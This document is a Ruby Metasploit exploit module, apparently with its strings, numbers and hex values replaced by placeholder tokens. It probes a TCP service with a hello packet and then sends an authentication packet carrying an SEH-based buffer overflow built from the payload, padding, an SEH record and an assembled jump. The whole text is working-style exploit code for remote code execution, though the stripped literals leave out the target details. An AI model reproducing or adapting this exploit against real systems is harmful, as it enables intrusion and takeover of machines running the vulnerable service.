require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: Tcp include Msf :: Exploit :: Remote :: Seh def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > <int> , <str> = > <str> , <str> = > true } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <hex> , <str> = > <int> } ] ] , <str> = > <int> , <str> = > true , <str> = > <str> ) ) register_options ( [ Opt :: RPORT ( <int> ) , ] , self . class ) end def check connect machine_name = rand_text_alpha ( <int> ) print_status ( <str> sock . peerinfo <str> ) hello = <str> << <str> hello << <str> << <str> hello << <str> << <str> hello << <str> << <str> hello << <str> << <str> hello << <str> hello << machine_name << <str> hello << <str> << <str> hello << <str> << <str> hello << <str> << <str> sock . put ( hello ) hello_response = sock . get_once ( - <int> , <int> ) disconnect if hello_response and hello_response =~ <str> return Exploit :: CheckCode :: Detected end return Exploit :: CheckCode :: Safe end def exploit connect machine_name = rand_text_alpha ( <int> ) print_status ( <str> sock . peerinfo <str> ) hello = <str> << <str> hello << <str> << <str> hello << <str> << <str> hello << <str> << <str> hello << <str> << <str> hello << <str> hello << machine_name << <str> hello << <str> << <str> hello << <str> << <str> hello << <str> << <str> sock . put ( hello ) hello_response = sock . get_once ( - <int> , <int> ) if not hello_response or hello_response . empty? print_error ( <str> sock . peerinfo <str> ) return end bof = payload . encoded bof << rand_text ( target [ <str> ] - bof . length ) bof << generate_seh_record ( target . ret ) bof << Metasm :: Shellcode . assemble ( Metasm :: Ia32 . new , <str> target [ <str> ] + <int> <str> ) . encode_string bof << rand_text ( <int> ) header = [ <hex> ] . pack ( <str> ) header << [ <hex> ] . pack ( <str> ) header << [ <hex> ] . pack ( <str> ) header << [ <int> ] . pack ( <str> ) header << <str> pkt_auth = header pkt_auth << bof pkt_auth [ <int> , <int> ] = [ pkt_auth . length ] . pack ( <str> ) print_status ( <str> sock . peerinfo <str> ) sock . put ( pkt_auth ) disconnect end end 
